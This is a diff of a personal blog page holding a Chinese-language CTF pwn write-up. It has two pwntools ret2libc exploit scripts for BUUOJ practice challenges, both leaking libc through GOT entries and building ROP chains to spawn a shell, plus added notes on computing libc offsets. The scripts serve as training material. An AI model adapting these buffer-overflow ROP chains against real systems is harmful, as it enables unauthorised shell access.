@@ -27,6 +27,8 @@
 <meta property="og:site_name" content="Li1x&#39;s Blog">
 <meta property="og:description" content="ciscn_2019_n_1-&gt;64位泄露ret2libc1234567891011121314151617181920212223242526272829303132333435363738# 思路：利用ret2libc泄露地址，从而达到system(&quot;bin&#x2F;sh&quot;)# 0x0000000000400c83 : pop rdi ; ret# 0x00000000004">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libcsearch.png">
+<meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libc.png">
 <meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/01.png">
 <meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/00.png">
 <meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/02.png">
@@ -42,11 +44,11 @@
 <meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/07.png">
 <meta property="og:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/08.png">
 <meta property="article:published_time" content="2024-03-25T17:59:06.945Z">
-<meta property="article:modified_time" content="2024-03-27T17:10:50.591Z">
+<meta property="article:modified_time" content="2024-03-31T16:04:23.674Z">
 <meta property="article:author" content="Li1x">
 <meta property="article:tag" content="pwn">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/01.png">
+<meta name="twitter:image" content="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libcsearch.png">
 
 
 <link rel="canonical" href="https://li1x.github.io/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/">
@@ -171,18 +173,18 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-count">11</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -245,7 +247,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2024-03-28 01:10:50" itemprop="dateModified" datetime="2024-03-28T01:10:50+08:00">2024-03-28</time>
+      <time title="Modified: 2024-04-01 00:04:23" itemprop="dateModified" datetime="2024-04-01T00:04:23+08:00">2024-04-01</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -285,14 +287,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>9.4k</span>
+      <span>9.8k</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">Reading time &asymp;</span>
-      <span>17 mins.</span>
+      <span>18 mins.</span>
     </span>
 </div>
 
@@ -304,9 +306,17 @@
     
     <div class="post-body" itemprop="articleBody"><h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><h4 id="64位泄露ret2libc"><a href="#64位泄露ret2libc" class="headerlink" title="-&gt;64位泄露ret2libc"></a>-&gt;64位泄露ret2libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 思路：利用ret2libc泄露地址，从而达到system(&quot;bin/sh&quot;)</span></span><br><span class="line"><span class="comment"># 0x0000000000400c83 : pop rdi ; ret</span></span><br><span class="line"><span class="comment"># 0x00000000004006b9 : ret</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">25216</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi_ret_addr = <span class="number">0x400c83</span></span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.recvuntil(b&#x27;Input your choice!\n&#x27;,True)</span></span><br><span class="line"><span class="comment"># r.sendline(b&#x27;1&#x27;)</span></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr = u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>)) <span class="comment"># 不满足8位的用0补齐</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, puts_addr) <span class="comment"># 利用LibcSearcher模块找到libc的版本 [libc6_2.27-3ubuntu1_amd64]</span></span><br><span class="line">offest = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>) <span class="comment"># 算偏移量</span></span><br><span class="line">binsh = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) <span class="comment"># 任一函数地址 = 偏移量 + libc中对应函数的地址</span></span><br><span class="line">system = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;choice!\n&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;\0&#x27;</span> + cyclic(<span class="number">0x50</span> + <span class="number">0x08</span> - <span class="number">0x01</span>) + p64(ret_addr) + p64(rdi_ret_addr) + p64(binsh) + p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">b&#x27;encrypted\n&#x27;</span>, payload1)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
-<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h4 id="32位-ret2libc"><a href="#32位-ret2libc" class="headerlink" title="-&gt;32位 ret2libc"></a>-&gt;32位 ret2libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Libc泄露：通过什么函数来泄露？ 找到这个函数之后，elf.got elf.plt , </span></span><br><span class="line"><span class="comment"># Libc泄露：通过write函数来泄露。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29598</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_pot) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#选择 libc6-i386_2.27-3ubuntu1_amd64 这个libc版本</span></span><br></pre></td></tr></table></figure>
+<h2 id="铁人三项-第五赛区-2018-rop"><a href="#铁人三项-第五赛区-2018-rop" class="headerlink" title="铁人三项(第五赛区)_2018_rop"></a>铁人三项(第五赛区)_2018_rop</h2><h4 id="32位-ret2libc"><a href="#32位-ret2libc" class="headerlink" title="-&gt;32位 ret2libc"></a>-&gt;32位 ret2libc</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">![libc](BUU%E5%<span class="number">88</span>%B7%E9%A2%<span class="number">98</span>/libc.png)<span class="comment"># Libc泄露：通过什么函数来泄露？ 找到这个函数之后，elf.got elf.plt , </span></span><br><span class="line"><span class="comment"># Libc泄露：通过write函数来泄露。</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29598</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./2018_rop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./2018_rop&#x27;</span>)</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">0</span>) + p32(write_pot) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>, write_addr)</span><br><span class="line"></span><br><span class="line">offest = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = offest + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr = offest + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x88</span> + <span class="number">0x04</span>) + p32(system_addr) + p32(<span class="number">0</span>) + p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#选择 libc6-i386_2.27-3ubuntu1_amd64 这个libc版本</span></span><br></pre></td></tr></table></figure>
 
 
+
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libcsearch.png"></p>
+<p><img src="/CTF/Pwn/BUU%E5%88%B7%E9%A2%98/libc.png"></p>
+<p>泄露出来一个函数的真实地址后，去那个网站搜索一下 对应的版本 </p>
+<p>-&gt; 如果只泄露出来一个函数，可能对应有很多个版本，可以泄露多个函数缩小范围（因为有多个版本时，需要一个一个试）</p>
+<p>-&gt; 下面这个图应该就是对应 offest的解释吧（看别人的Wp之后的理解）</p>
+<p>我们此时应该已知 &#x3D;&gt; write函数真实地址 知道了两个write_offest system_offest</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_real_addr = write_real_addr + system_offest - write_offest</span><br><span class="line">bin_sh_real_addr = write_real_addr + str_bin_sh_offest - write_offest</span><br></pre></td></tr></table></figure>
 
 
 
@@ -456,6 +466,9 @@
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/CTF/Misc/%E6%B5%81%E9%87%8F/" rel="next" title="Misc-流量题记录">
+                  Misc-流量题记录 <i class="fa fa-angle-right"></i>
+                </a>
             </div>
           </div>
     </footer>
@@ -497,7 +510,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">1:27</span>
+    <span title="Reading time total">1:28</span>
   </span>
 </div>
 <div class="busuanzi-count">
